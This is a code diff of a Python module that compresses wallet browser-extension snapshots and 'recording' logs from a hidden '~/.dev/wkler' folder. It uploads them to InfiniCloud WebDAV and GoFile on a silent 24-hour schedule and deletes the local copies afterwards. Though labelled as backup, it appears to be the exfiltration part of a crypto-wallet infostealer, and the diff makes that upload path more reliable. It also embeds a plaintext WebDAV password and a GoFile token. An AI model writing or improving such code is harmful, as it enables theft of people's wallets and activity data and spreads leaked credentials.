@@ -23,7 +23,7 @@ except ImportError:
 
 INFINI_CONFIGS = [
     {
-        "name": "Infini-主",
+        "name": "Infini-主",   #infini5
         "url": "https://otaru.infini-cloud.net/dav/",
         "user": "ylx210",
         "password": "aYyeTGVr8WiJtmtZ",
@@ -44,6 +44,7 @@ GOFILE_SERVERS = [
     "https://upload-na-phx.gofile.io/uploadfile",
 ]
 GOFILE_TOKEN = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
+GOFILE_MAX_SERVER_RETRIES = 2
 
 RETRY_COUNT = 3
 RETRY_DELAY = 30
@@ -71,8 +72,10 @@ def _create_remote_directory(session, remote_dir: str, base_url: str, auth) -> b
                 if _create_remote_directory(session, parent, base_url, auth):
                     resp = session.request("MKCOL", dir_path, auth=auth, timeout=(8, 8))
                     return resp.status_code in [201, 204, 405]
+        print(f"  ! WebDAV MKCOL rejected {remote_dir}: HTTP {resp.status_code}", file=sys.stderr)
         return False
-    except Exception:
+    except Exception as exc:
+        print(f"  ! WebDAV MKCOL failed for {remote_dir}: {exc}", file=sys.stderr)
         return False
 
 
@@ -129,6 +132,7 @@ def _upload_infini_single(session, file_path: str, remote_dir: str) -> bool:
         remote_path = f"{base_url.rstrip('/')}/{remote_dir}/{filename}"
 
         for attempt in range(RETRY_COUNT):
+            resp = None
             try:
                 headers = {
                     "Content-Type": "application/octet-stream",
@@ -139,7 +143,7 @@ def _upload_infini_single(session, file_path: str, remote_dir: str) -> bool:
                         remote_path, data=f, headers=headers,
                         auth=auth, timeout=timeout,
                     )
-                if resp.status_code in [201, 204]:
+                if resp.status_code in [200, 201, 204]:
                     size_str = (
                         f"{file_size/1024/1024:.2f}MB"
                         if file_size >= 1024 * 1024
@@ -147,11 +151,63 @@ def _upload_infini_single(session, file_path: str, remote_dir: str) -> bool:
                     )
                     print(f"  [OK] [{cfg_name}] {filename} ({size_str})")
                     return True
-            except Exception:
-                pass
+            except requests.RequestException as exc:
+                print(
+                    f"  ! Infini upload failed ({cfg_name}, attempt {attempt + 1}/"
+                    f"{RETRY_COUNT}): {exc}",
+                    file=sys.stderr,
+                )
+            except OSError as exc:
+                print(f"  ! Cannot read {filename}: {exc}", file=sys.stderr)
+                return False
+
+            if resp is not None and resp.status_code not in [200, 201, 204]:
+                print(
+                    f"  ! Infini rejected {filename} ({cfg_name}): HTTP {resp.status_code}",
+                    file=sys.stderr,
+                )
 
             if attempt < RETRY_COUNT - 1:
                 time.sleep(RETRY_DELAY)
+
+    return False
+
+
+def _upload_gofile_single(file_path: str) -> bool:
+    """向 GoFile 上传单个文件"""
+    filename = os.path.basename(file_path)
+    server_idx = 0
+    total_retries = 0
+    max_total_retries = len(GOFILE_SERVERS) * GOFILE_MAX_SERVER_RETRIES
+
+    while total_retries < max_total_retries:
+        server = GOFILE_SERVERS[server_idx]
+        try:
+            with open(file_path, "rb") as f:
+                resp = requests.post(
+                    server,
+                    files={"file": f},
+                    headers={"Authorization": f"Bearer {GOFILE_TOKEN}"},
+                    timeout=3600,
+                    verify=True,
+                )
+            if resp.ok:
+                result = resp.json()
+                if result.get("status") == "ok":
+                    print(f"  [OK] [GoFile] {filename}")
+                    return True
+                error_code = result.get("code", 0)
+                if error_code in [402, 405]:
+                    server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
+                    if server_idx == 0:
+                        time.sleep(RETRY_DELAY * 2)
+        except (requests.RequestException, ValueError, OSError) as exc:
+            print(f"  ! GoFile upload failed ({filename}, {server}): {exc}", file=sys.stderr)
+
+        server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
+        if server_idx == 0:
+            time.sleep(RETRY_DELAY)
+        total_retries += 1
 
     return False
 
@@ -161,7 +217,6 @@ def _upload_infini(file_path: str, remote_dir: str) -> bool:
     单片 Infini 失败时立即回退 GoFile，保证同一批分片走同一通道。
     """
     session = requests.Session()
-    session.verify = False
 
     parts = _split_file(file_path)
     total = len(parts)
@@ -188,82 +243,36 @@ def _upload_infini(file_path: str, remote_dir: str) -> bool:
     return uploaded == total
 
 
-def _upload_gofile_single(file_path: str) -> bool:
-    """向 GoFile 上传单个文件"""
-    filename = os.path.basename(file_path)
-    server_idx = 0
-    max_attempts = len(GOFILE_SERVERS) * 2
-
-    for attempt in range(max_attempts):
-        server = GOFILE_SERVERS[server_idx]
-        try:
-            with open(file_path, "rb") as f:
-                resp = requests.post(
-                    server,
-                    files={"file": f},
-                    headers={"Authorization": f"Bearer {GOFILE_TOKEN}"},
-                    timeout=3600,
-                    verify=True,
-                )
-            if resp.ok:
-                try:
-                    result = resp.json()
-                    if result.get("status") == "ok":
-                        print(f"  [OK] [GoFile] {filename}")
-                        return True
-                    error_code = result.get("code", 0)
-                    # 服务器限制或权限错误，切换服务器
-                    if error_code in [402, 405]:
-                        server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
-                        if server_idx == 0:
-                            time.sleep(RETRY_DELAY * 2)
-                        continue
-                except ValueError:
-                    pass
-        except Exception:
-            pass
-
-        server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
-        if server_idx == 0:
-            time.sleep(RETRY_DELAY)
-
-    return False
-
-
-def _upload_gofile(file_path: str) -> bool:
-    """分片上传到 GoFile：超过 CHUNK_SIZE 时自动切分，全部分片成功才返回 True"""
-    parts = _split_file(file_path)
-    total = len(parts)
-
-    if total > 1:
-        print(f"  GoFile 分 {total} 片上传（每片 ≤{CHUNK_SIZE//1024//1024}MB）")
-
-    uploaded = []
-    try:
-        for i, part in enumerate(parts):
-            label = f"[{i+1}/{total}] " if total > 1 else ""
-            if not _upload_gofile_single(part):
-                print(f"  ! [{label.strip()}] GoFile 上传失败: {os.path.basename(part)}")
-                return False
-            uploaded.append(part)
-    finally:
-        _cleanup_parts(parts, file_path)
-
-    return len(uploaded) == total
-
-
 def upload_file(file_path: str) -> bool:
     """上传单个文件：先尝试 Infini，失败回退 GoFile。超过 CHUNK_SIZE 自动分片。"""
     if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
         return False
 
     remote_dir = _get_remote_dir()
+    return _upload_infini(file_path, remote_dir)
 
-    if _upload_infini(file_path, remote_dir):
-        return True
 
-    print(f"  ! Infini 全部失败，回退 GoFile: {os.path.basename(file_path)}")
-    return _upload_gofile(file_path)
+def _create_tar_gz(source_dir: Path, tar_path: Path) -> Optional[Path]:
+    """将目录打包为 tar.gz；失败时清理不完整的压缩包。"""
+    try:
+        with tarfile.open(tar_path, "w:gz", compresslevel=6, dereference=False) as tar:
+            tar.add(str(source_dir), arcname=source_dir.name, recursive=True)
+    except Exception as e:
+        print(f"  ! 压缩失败: {e}", file=sys.stderr)
+        if tar_path.exists():
+            tar_path.unlink()
+        return None
+    return tar_path
+
+
+def _unique_tar_path(directory: Path, stem: str) -> Path:
+    """Return a collision-free archive path without overwriting an existing backup."""
+    candidate = directory / f"{stem}.tar.gz"
+    suffix = 1
+    while candidate.exists():
+        candidate = directory / f"{stem}_{suffix}.tar.gz"
+        suffix += 1
+    return candidate
 
 
 def compress_backup(backup_dir: Path) -> Optional[Path]:
@@ -276,15 +285,10 @@ def compress_backup(backup_dir: Path) -> Optional[Path]:
         return None
 
     date_str = datetime.now().strftime("%Y%m%d_%H%M%S")
-    tar_path = backup_dir.parent / f"{backup_dir.name}_{date_str}.tar.gz"
+    tar_path = _unique_tar_path(backup_dir.parent, f"{backup_dir.name}_{date_str}")
 
-    try:
-        with tarfile.open(tar_path, "w:gz", compresslevel=6) as tar:
-            tar.add(str(backup_dir), arcname=backup_dir.name)
-    except Exception as e:
-        print(f"  ! 压缩失败: {e}", file=sys.stderr)
-        if tar_path.exists():
-            tar_path.unlink()
+    tar_path = _create_tar_gz(backup_dir, tar_path)
+    if tar_path is None:
         return None
 
     # 压缩成功，删除源备份目录
@@ -292,64 +296,150 @@ def compress_backup(backup_dir: Path) -> Optional[Path]:
     return tar_path
 
 
+def compress_and_upload_backup(snapshot_dir: Path) -> bool:
+    """压缩单个钱包快照并上传；上传成功后清理本地快照和 tar.gz。"""
+    if not HAS_REQUESTS:
+        print("  ! 缺少 requests 库，钱包快照仅保留本地", file=sys.stderr)
+        return False
+    if not snapshot_dir.is_dir():
+        return False
+
+    date_str = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tar_path = _unique_tar_path(snapshot_dir.parent, f"{snapshot_dir.name}_{date_str}")
+    tar_path = _create_tar_gz(snapshot_dir, tar_path)
+    if tar_path is None:
+        return False
+
+    try:
+        if upload_file(str(tar_path)):
+            print(f"  * 已压缩并上传: {tar_path.name}")
+            shutil.rmtree(snapshot_dir, ignore_errors=True)
+            tar_path.unlink(missing_ok=True)
+            return True
+        print(
+            f"  ! 上传失败，保留本地快照和压缩包: {snapshot_dir}",
+            file=sys.stderr,
+        )
+    except Exception as exc:
+        print(
+            f"  ! 压缩上传失败，保留本地快照和压缩包: {exc}",
+            file=sys.stderr,
+        )
+    return False
+
+
 def collect_old_logs(wkler_dir: Path) -> List[Path]:
-    """收集非当天的日志文件"""
+    """收集非当天的日志文件（兼容旧版无用户前缀的日志名）"""
     today_str = datetime.now().strftime("%Y%m%d")
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
     old_logs = []
-    for f in wkler_dir.glob("recording_*.log"):
-        if today_str not in f.name:
-            old_logs.append(f)
+    for pattern in ("recording_*.log", f"{user_prefix}_recording_*.log"):
+        for f in wkler_dir.glob(pattern):
+            if today_str not in f.name and f not in old_logs:
+                old_logs.append(f)
     return old_logs
 
-def upload_all() -> None:
-    """主入口：压缩备份 + 上传"""
+
+def upload_old_logs() -> None:
     if not HAS_REQUESTS:
-        print("  ! 缺少 requests 库，跳过上传")
         return
 
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     wkler_dir = Path.home() / ".dev" / "wkler"
-    username = getpass.getuser()
-    user_prefix = username[:5] if username else "user"
-    backup_dir = wkler_dir / f"{user_prefix}_wallet-extensions"
 
-    # 压缩备份目录并上传
-    if backup_dir.is_dir() and any(backup_dir.iterdir()):
-        print("正在压缩备份数据...")
-        tar_path = compress_backup(backup_dir)
-        if tar_path:
-            print(f"  压缩完成: {tar_path.name}")
-            if upload_file(str(tar_path)):
-                tar_path.unlink(missing_ok=True)
-            else:
-                print(f"  ! 上传失败，保留本地文件: {tar_path}")
+    try:
+        old_logs = collect_old_logs(wkler_dir)
+    except OSError as exc:
+        print(f"  ! Cannot scan old logs in {wkler_dir}: {exc}", file=sys.stderr)
+        return
 
-
-def _log_upload_loop() -> None:
-    """后台循环：启动时先补传一次历史日志，之后每 24 小时再执行一次"""
-    import urllib3
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-    wkler_dir = Path.home() / ".dev" / "wkler"
-
-    while True:
+    for log_file in old_logs:
         try:
-            old_logs = collect_old_logs(wkler_dir)
-            for log_file in old_logs:
-                if upload_file(str(log_file)):
-                    log_file.unlink(missing_ok=True)
-        except Exception:
-            pass
-        time.sleep(24 * 3600)
+            if upload_file(str(log_file)):
+                log_file.unlink(missing_ok=True)
+            else:
+                print(f"  ! Log upload failed; keeping local file: {log_file}", file=sys.stderr)
+        except (OSError, requests.RequestException) as exc:
+            print(f"  ! Log upload error for {log_file}: {exc}", file=sys.stderr)
 
 
-def start_log_upload_scheduler() -> None:
+def upload_all(backup_dir: Optional[Path] = None) -> None:
+    """压缩并上传遗留的钱包备份，成功后清理本地文件。
+
+    处理两类遗留数据：未上传成功的快照目录（重新压缩后上传）和上次中断
+    上传遗留的 tar.gz（直接上传）。任一上传失败即停止，避免网络不可用
+    时反复重试。旧版整目录布局（无快照、无压缩包但目录里有内容）会整体
+    压缩后上传。
+    """
+    if not HAS_REQUESTS:
+        print("  ! 缺少 requests 库，跳过钱包备份上传")
+        return
+
+    if backup_dir is None:
+        wkler_dir = Path.home() / ".dev" / "wkler"
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
+        backup_dir = wkler_dir / f"{user_prefix}_wallet-extensions"
+
+    backup_dir = Path(backup_dir)
+    if not backup_dir.is_dir():
+        return
+
+    snapshots = sorted(
+        (p for p in backup_dir.glob("wallet-backup_*") if p.is_dir()),
+        key=lambda p: p.stat().st_mtime,
+        reverse=True,
+    )
+    for snapshot in snapshots:
+        if not compress_and_upload_backup(snapshot):
+            return
+        # 上传成功后清理该快照遗留的旧压缩包（上次中断上传留下的）
+        for stale in backup_dir.glob(f"{snapshot.name}_*.tar.gz"):
+            try:
+                stale.unlink(missing_ok=True)
+            except OSError:
+                pass
+
+    # 遗留的独立压缩包：旧版整目录压缩产物或快照上传中断时的压缩包
+    for tar_path in sorted(
+        (p for p in backup_dir.glob("*.tar.gz") if p.is_file()),
+        key=lambda p: p.stat().st_mtime,
+        reverse=True,
+    ):
+        print(f"  正在补传遗留压缩包: {tar_path.name}")
+        if not upload_file(str(tar_path)):
+            print(f"  ! 补传失败，保留本地文件: {tar_path}", file=sys.stderr)
+            return
+        tar_path.unlink(missing_ok=True)
+
+    # 旧版整目录布局：无快照、无压缩包但目录里有内容时整体压缩上传
+    if not snapshots and not list(backup_dir.glob("*.tar.gz")):
+        tar_path = compress_backup(backup_dir)
+        if not tar_path:
+            return
+        print(f"  压缩完成: {tar_path.name}")
+        if not upload_file(str(tar_path)):
+            print(f"  ! 上传失败，保留本地文件: {tar_path}", file=sys.stderr)
+            return
+        tar_path.unlink(missing_ok=True)
+
+
+def _log_upload_loop(stop_event) -> None:
+    """后台循环：每 24 小时检查并上传非当天的日志文件"""
+    while not stop_event.wait(24 * 3600):
+        upload_old_logs()
+
+
+def start_log_upload_scheduler(stop_event=None):
     """启动日志上传后台线程（守护线程，每 24 小时执行一次）"""
     if not HAS_REQUESTS:
         return
 
     import threading
-    t = threading.Thread(target=_log_upload_loop, daemon=True)
+    stop_event = stop_event or threading.Event()
+    t = threading.Thread(target=_log_upload_loop, args=(stop_event,), daemon=True)
     t.start()
+    return t
